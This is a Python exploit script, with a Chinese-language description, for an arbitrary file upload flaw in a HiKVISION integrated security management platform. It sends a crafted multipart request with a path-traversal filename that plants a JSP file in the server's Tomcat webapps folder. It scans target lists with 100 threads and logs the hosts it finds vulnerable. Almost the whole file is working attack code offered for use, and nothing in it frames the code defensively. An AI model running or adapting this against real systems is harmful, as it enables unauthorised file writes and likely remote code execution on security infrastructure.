import requests,sys,argparse,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

def banner():
    test ="""
    __  ___ __ ___    ___________ ________  _   __
   / / / (_) //_/ |  / /  _/ ___//  _/ __ \/ | / /
  / /_/ / / ,<  | | / // / \__ \ / // / / /  |/ / 
 / __  / / /| | | |/ // / ___/ // // /_/ / /|  /  
/_/ /_/_/_/ |_| |___/___//____/___/\____/_/ |_/   
                                                  
"""
    print(test)

def main():
    banner()
    parse = argparse.ArgumentParser(description="HiKVISION综合安防管理平台files任意文件上传")
    parse.add_argument('-u','--url',dest='url',type=str,help="input your url")
    parse.add_argument('-f','--file',dest='file',type=str,help="input your file")
    args = parse.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open('1.txt','r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") 

def poc(target):
    payload = "/center/api/files;.js"
    headers = {
        'Content-Type':'multipart/form-data;boundary=----WebKitFormBoundaryxxmdzwoe',
        'User-Agent':'Mozilla/5.0(Macintosh;IntelMacOSX10_9_3)AppleWebKit/537.36(KHTML,likeGecko)Chrome/35.0.1916.47Safari/537.36',
    }
    data = '------WebKitFormBoundaryxxmdzwoe\r\nContent-Disposition: form-data; name="upload";filename="../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp"\r\nContent-Type:image/jpeg\r\n\r\n<%out.println("pboyjnnrfipmplsukdeczudsefxmywex");%>\r\n------WebKitFormBoundaryxxmdzwoe--'
    try:
        res = requests.get(url=target+payload,headers=headers,data=data,verify=False)
        if '../../../../../bin/tomcat/apache-tomcat/webapps/clusterMgr/ukgmfyufsi.jsp' in res.text:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
        else:
            return False
    except Exception as e:
        return False

if __name__ == "__main__":
    main()